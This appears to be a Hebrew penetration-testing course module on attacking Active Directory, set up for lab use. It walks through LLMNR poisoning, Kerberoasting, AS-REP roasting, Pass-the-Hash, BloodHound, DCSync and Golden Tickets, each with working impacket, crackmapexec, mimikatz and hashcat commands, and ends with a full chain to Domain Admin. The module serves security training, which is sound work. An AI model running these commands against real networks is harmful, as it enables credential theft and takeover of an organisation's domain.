<div dir="rtl">

> 📘 **הכול בגלילה אחת:** [**כל החומר של המודול בקובץ אחד**](כל-החומר.md) — חומר לימוד, תרגילים, תרגול ופתרונות, ברצף.

# מודול 13 — Active Directory (AD)

> **מטרות המודול:** לתקוף את הטכנולוגיה שמנהלת את **רוב הארגונים בעולם** — Microsoft Active Directory. נלמד את מבנה ה-Domain, נבצע **Enumeration** (BloodHound), ונשלוט בהתקפות המפתח: **LLMNR Poisoning**, **Kerberoasting**, **Pass-the-Hash**, ו-**AS-REP Roasting** — עד להשתלטות על ה-**Domain Controller (Domain Admin)**.
>
> **קבצים:** `README.md` · [`missions.md`](missions.md) · [`solutions.md`](solutions.md) · [`practice.md`](practice.md) · [`slides.md`](slides.md).

> ⚠️ **דרישת מעבדה — קרא לפני שתתחיל!**
> מעבדת AD דורשת **Domain Controller (Windows Server) + 1–2 מכונות לקוח (Windows 10)** במקביל — סה"כ **12GB+ RAM**. אם למחשב שלך אין מספיק זיכרון, **תרגל בענן**: חדרי **TryHackMe** — *Attacktive Directory*, *Post-Exploitation Basics*, ומסלול *"Active Directory"* — נותנים סביבת AD מלאה ללא צורך בחומרה מקומית. זו הדרך המומלצת ללמד את המודול הזה.

---

## תוכן העניינים
1. [מהו Active Directory](#131-מהו-active-directory)
2. [מבנה ומושגי יסוד](#132-מבנה-ומושגי-יסוד)
3. [הקמת מעבדת AD (או ענן)](#133-הקמת-מעבדת-ad-או-ענן)
4. [Enumeration של הדומיין](#134-enumeration-של-הדומיין)
5. [LLMNR / NBT-NS Poisoning](#135-llmnr--nbt-ns-poisoning)
6. [Kerberoasting](#136-kerberoasting)
7. [AS-REP Roasting](#137-as-rep-roasting)
8. [Pass-the-Hash ו-Pass-the-Ticket](#138-pass-the-hash-ו-pass-the-ticket)
9. [BloodHound — מיפוי נתיבי תקיפה](#139-bloodhound--מיפוי-נתיבי-תקיפה)
10. [הגעה ל-Domain Admin ו-DCSync](#1310-הגעה-ל-domain-admin-ו-dcsync)

---

## 13.1 מהו Active Directory

**Active Directory (AD)** הוא שירות הספרייה של Microsoft לניהול רשתות ארגוניות. הוא מנהל **משתמשים, מחשבים, הרשאות ומדיניות** ממקום מרכזי אחד — ה-**Domain Controller (DC)**.

**למה זה הנושא הכי חשוב בבדיקות חדירה פנימיות?**
- **~95% מחברות Fortune 500** משתמשות ב-AD.
- כמעט כל בדיקת חדירה פנימית (Internal Pentest) היא, בפועל, **תקיפת AD**.
- השתלטות על ה-DC = שליטה על **כל** המשתמשים והמחשבים בארגון.

> 🎯 המטרה במודול: מ**משתמש דומיין רגיל** (או אפילו ללא אישורים) → **Domain Admin**.

---

## 13.2 מבנה ומושגי יסוד

| מושג | הסבר |
|------|------|
| **Domain** | גבול ניהולי לוגי (`corp.local`) |
| **Domain Controller (DC)** | השרת שמריץ את AD; מאמת התחברויות |
| **Forest** | אוסף דומיינים |
| **OU (Organizational Unit)** | "תיקייה" לארגון אובייקטים |
| **GPO (Group Policy)** | מדיניות שנאכפת על מחשבים/משתמשים |
| **Kerberos** | פרוטוקול האימות המרכזי (Tickets) |
| **NTLM** | פרוטוקול אימות ישן יותר (Hashes) |
| **SPN** | Service Principal Name — מזהה שירות (מפתח ל-Kerberoasting) |

**איך עובד אימות Kerberos (בקצרה):**
1. המשתמש מבקש **TGT** (Ticket Granting Ticket) מה-DC (שירות KDC).
2. עם ה-TGT, המשתמש מבקש **TGS** (Service Ticket) לשירות מסוים.
3. מציג את ה-TGS לשירות → גישה.

> 💡 רוב התקיפות מנצלות **חולשות בתכנון Kerberos/NTLM** ובהגדרות שגויות — לא "באגים". זו הסיבה ש-AD כה פגיע: המורכבות עצמה היא משטח התקיפה.

---

## 13.3 הקמת מעבדת AD (או ענן)

### אפשרות א' — ענן (מומלץ אם RAM מוגבל) ☁️
- **TryHackMe** — *Attacktive Directory*, *Attacking Kerberos*, מסלול *Active Directory* מלא. סביבה מוכנה, ללא חומרה.
- **HackTheBox** — Pro Labs (Dante, Zephyr) עם AD מלא.

### אפשרות ב' — מקומי (דורש 12GB+ RAM)
- **DC:** Windows Server 2019 (`dcpromo` → מתקין AD DS).
- **לקוחות:** 1–2 מכונות Windows 10 מחוברות לדומיין.
- כלי אוטומציה להקמה: **[GOAD — Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)** (מעבדה פגיעה מוכנה).

### הכלים על Kali (התוקף)
```bash
# רוב הכלים מותקנים או זמינים:
impacket-scripts        # GetUserSPNs, secretsdump, psexec, wmiexec...
crackmapexec / nxc      # "הסכין השוויצרי" של AD
bloodhound + neo4j      # מיפוי נתיבי תקיפה
responder               # LLMNR poisoning
evil-winrm              # shell מרוחק ל-Windows
```

---

## 13.4 Enumeration של הדומיין

מתחילים באיסוף מידע על הדומיין:

```bash
# ללא אישורים — מידע ראשוני מ-SMB/LDAP:
crackmapexec smb <dc-ip>                      # שם דומיין, גרסה, hostname
enum4linux-ng -A <dc-ip>                       # משתמשים, shares, policy
nmap -p 88,389,445,636 -sV <dc-ip>             # DC ports (Kerberos=88, LDAP=389)

# עם אישורי משתמש רגיל:
crackmapexec smb <dc-ip> -u user -p pass --users --groups --shares
GetADUsers.py corp.local/user:pass -all        # רשימת משתמשים
```

> 🔍 גם משתמש דומיין **הכי מוגבל** יכול לתשאל את כל AD (LDAP) — זו "תכונה", לא באג. משם מתחילים לבנות את נתיב התקיפה.

---

## 13.5 LLMNR / NBT-NS Poisoning

**התקיפה הראשונה בכל בדיקה פנימית** — לרוב לא צריך אפילו אישורים.

**הרעיון:** כשמחשב Windows מחפש שם שלא נמצא ב-DNS, הוא "צועק" לרשת בפרוטוקולים **LLMNR/NBT-NS**: *"מי זה FILESERVER?"*. התוקף עונה *"אני!"* — והקורבן שולח לו את ה-**NTLMv2 hash** שלו.

```bash
# הפעלת Responder — "מרעיל" את הרשת:
sudo responder -I eth0 -dwv
# ← ממתין; כשמשתמש ניגש לשם שגוי, ה-hash נלכד
```
את ה-hash שנלכד → **מפצחים** (מודול 8):
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> 🎯 LLMNR Poisoning הוא **נקודת הכניסה** הקלאסית: מ"אין כלום" ל"אישורי משתמש ראשונים" — לרוב תוך דקות ברשת ארגונית אמיתית.

---

## 13.6 Kerberoasting

**התקיפה הכי מתגמלת** כשיש לך כבר אישורי משתמש דומיין (כל משתמש!).

**הרעיון:** כל **חשבון שירות** עם SPN מנפיק **TGS ticket** מוצפן ב-hash של סיסמת השירות. **כל** משתמש דומיין יכול לבקש את ה-tickets האלה — ואז לפצח אותם offline.

```bash
# בקשת כל ה-TGS של חשבונות שירות:
GetUserSPNs.py corp.local/user:pass -dc-ip <dc-ip> -request
# או עם crackmapexec:
crackmapexec ldap <dc-ip> -u user -p pass --kerberoasting out.txt

# פיצוח ה-tickets offline:
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```
חשבונות שירות לרוב עם סיסמאות **ישנות וחלשות** ולעיתים הרשאות גבוהות → הסלמה משמעותית.

> 🔑 Kerberoasting הוא ה"מנצח" של רוב בדיקות ה-AD: שקט (לא נוגע ב-DC ישירות בצורה חשודה), אמין, ולעיתים מוביל ישר ל-Domain Admin.

---

## 13.7 AS-REP Roasting

**וריאנט** של Kerberoasting לחשבונות עם **"Do not require Kerberos preauthentication"** מסומן.

**הרעיון:** לחשבונות כאלה, ה-DC ישלח חלק מוצפן (AS-REP) **ללא** שהמשתמש יוכיח את זהותו — כלומר, אפשר לבקש אותו **ללא סיסמה** ולפצח offline.

```bash
# מציאת חשבונות פגיעים ובקשת ה-hash (אפשר גם ללא אישורים אם יש רשימת שמות):
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
# פיצוח:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> 💡 AS-REP Roasting לא דורש אפילו אישורים תקפים — רק **שמות משתמש**. לכן הוא נבדק מוקדם מאוד בבדיקה.

---

## 13.8 Pass-the-Hash ו-Pass-the-Ticket

לא תמיד צריך לפצח סיסמה — לעיתים אפשר **להשתמש ב-hash עצמו**.

### Pass-the-Hash (PtH)
עם NTLM hash של משתמש (מ-mimikatz/secretsdump) — מתחברים **בלי לדעת את הסיסמה**:
```bash
crackmapexec smb <target> -u admin -H <NTLM-hash>
psexec.py -hashes :<NTLM-hash> admin@<target>
evil-winrm -i <target> -u admin -H <NTLM-hash>
```

### Pass-the-Ticket (PtT)
"גונבים" TGT/TGS מזיכרון ומשתמשים בו ישירות (עם mimikatz / Rubeus).

### שליפת hashes ממכונה שנפרצה
```bash
secretsdump.py corp.local/admin:pass@<target>      # שולף SAM + LSA
# mimikatz:  sekurlsa::logonpasswords / lsadump::sam
```

> 🎯 Pass-the-Hash הוא הלב של **תנועה רוחבית ב-AD**: hash של Local Admin משותף בין מכונות → קופצים ממחשב למחשב עד ל-DC.

---

## 13.9 BloodHound — מיפוי נתיבי תקיפה

**BloodHound** אוסף את כל יחסי ה-AD (מי חבר בקבוצה, מי Admin על מה) ומצייר **גרף** — כולל את **"הנתיב הקצר ביותר ל-Domain Admin"**.

```bash
# איסוף הנתונים (מ-Kali עם אישורים, או SharpHound על מכונה):
bloodhound-python -u user -p pass -d corp.local -ns <dc-ip> -c All
# טוענים את ה-JSON ל-BloodHound GUI (neo4j) ומריצים שאילתות:
#   "Shortest Path to Domain Admins"
#   "Find Kerberoastable Accounts"
```

> 🔍 BloodHound הפך את תקיפת AD מ"אמנות" ל"מדע": במקום לנחש, אתה **רואה** בדיוק איזו שרשרת הרשאות מובילה ל-Domain Admin. כלי חובה.

---

## 13.10 הגעה ל-Domain Admin ו-DCSync

השלב הסופי — אחרי שהשגת חשבון בעל הרשאות גבוהות (דרך אחת התקיפות למעלה):

### DCSync
מדמה DC ומבקש מה-DC האמיתי **לשכפל** את מסד הנתונים של הסיסמאות — כולל ה-hash של **krbtgt** ושל **Administrator**:
```bash
secretsdump.py corp.local/DAuser:pass@<dc-ip>
# mimikatz:  lsadump::dcsync /user:Administrator
```

### Golden Ticket
עם ה-hash של **krbtgt**, יוצרים TGT מזויף שמעניק גישה **לכל שירות, כל משתמש, לתמיד** — שליטה מוחלטת בדומיין (Persistence עמוק).

```text
# שרשרת מלאה טיפוסית:
LLMNR/Responder → hash → crack → משתמש דומיין
  → Kerberoast → סיסמת שירות → הרשאות גבוהות
  → BloodHound מראה נתיב → DCSync → hash של Administrator
  → Pass-the-Hash ל-DC → Domain Admin 🏆
```

> 🏆 השגת **Domain Admin** = "Game Over" בבדיקת AD. משם שולטים בכל הארגון. זה היעד של כל בדיקת חדירה פנימית ושל בחינות PNPT/OSCP.

---

## סיכום המודול

- **Active Directory** מנהל את רוב הארגונים; בדיקה פנימית = תקיפת AD.
- **Enumeration:** crackmapexec, enum4linux, BloodHound — גם משתמש מוגבל מתשאל את כל AD.
- **LLMNR Poisoning** (Responder) = נקודת כניסה ללא אישורים.
- **Kerberoasting** / **AS-REP Roasting** = בקשת tickets ופיצוח offline.
- **Pass-the-Hash / Pass-the-Ticket** = תנועה רוחבית ללא סיסמה.
- **BloodHound** מצייר את הנתיב ל-Domain Admin; **DCSync** + **Golden Ticket** = שליטה מלאה.

### מה הלאה?
➡️ [**תרגילים — `missions.md`**](missions.md) · [**פתרונות — `solutions.md`**](solutions.md) · [**תרגול ותרחישים — `practice.md`**](practice.md)
➡️ [**מודול 14 — תקיפות אלחוטיות**](../14-wireless/)

[⬅️ חזרה למפת הקורס](../../README.md)

</div>
